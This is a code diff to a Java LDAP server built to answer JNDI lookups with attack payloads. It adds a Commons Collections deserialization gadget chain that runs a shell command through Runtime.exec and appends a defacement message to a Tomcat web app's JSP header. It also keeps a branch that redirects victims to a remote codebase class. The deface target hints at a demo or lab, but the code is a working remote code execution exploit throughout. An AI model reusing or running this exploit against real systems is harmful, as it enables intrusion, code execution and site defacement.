@@ -7,8 +7,17 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
 import io.undertow.Undertow;
 import io.undertow.util.Headers;
+import org.apache.commons.lang3.SerializationUtils;
 
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
@@ -21,6 +30,8 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
+import java.util.HashMap;
+import java.util.Map;
 
 public  class  Server  {
     private  static  final String LDAP_BASE = "dc=example,dc=com" ;
@@ -100,7 +111,6 @@ public  class  Server  {
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
             String base = result.getRequest().getBaseDN();
             Entry entry = new Entry(base);
-
             try {
                 sendResult(result, base, entry);
             } catch (LDAPException | MalformedURLException e) {
@@ -111,21 +121,51 @@ public  class  Server  {
         protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
             throws LDAPException, MalformedURLException
         {
-            URL turl = new URL(
-                this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")
-            );
-            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
-            e.addAttribute("javaClassName", "foo");
-            String cbstring = this.codebase.toString();
-            int refPos = cbstring.indexOf('#');
-            if (refPos > 0) {
-                cbstring = cbstring.substring(0, refPos);
-            }
-            e.addAttribute("javaCodeBase", cbstring);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", this.codebase.getRef());
-            result.sendSearchEntry(e);
-            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            System.out.println("Base = " + base);
+           if (base.equals("Commons")) {
+                //deserialization attack chain in commons collections
+                System.out.println("Send LDAP reference result for " + base + " containing a deserialized chain");
+
+                String[] command = {
+                        "/bin/sh",
+                        "-c",
+                        "echo '<center><h1>Nice container you have, I think I will move in!</h1></center>' >> /usr/local/tomcat/webapps/todolist/WEB-INF/views/common/header.jspf"};
+
+                final Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                        new InvokerTransformer("exec", new Class[] { String[].class }, new Object[] {command})
+                };
+                final Transformer transformerChain = new ChainedTransformer(transformers);
+
+                final Map innerMap = new HashMap();
+                final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+                TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+                e.addAttribute("javaClassName", "foo");
+                e.addAttribute("javaSerializedData", SerializationUtils.serialize(entry));
+                e.addAttribute("objectClass", "javaNamingReference");
+
+                result.sendSearchEntry(e);
+                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            } else {
+               URL turl = new URL(
+                       this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")
+               );
+               System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+               e.addAttribute("javaClassName", "foo");
+               String cbstring = this.codebase.toString();
+               int refPos = cbstring.indexOf('#');
+               if (refPos > 0) {
+                   cbstring = cbstring.substring(0, refPos);
+               }
+               e.addAttribute("javaCodeBase", cbstring);
+               e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+               e.addAttribute("javaFactory", this.codebase.getRef());
+               result.sendSearchEntry(e);
+               result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+           }
         }
     }
 }
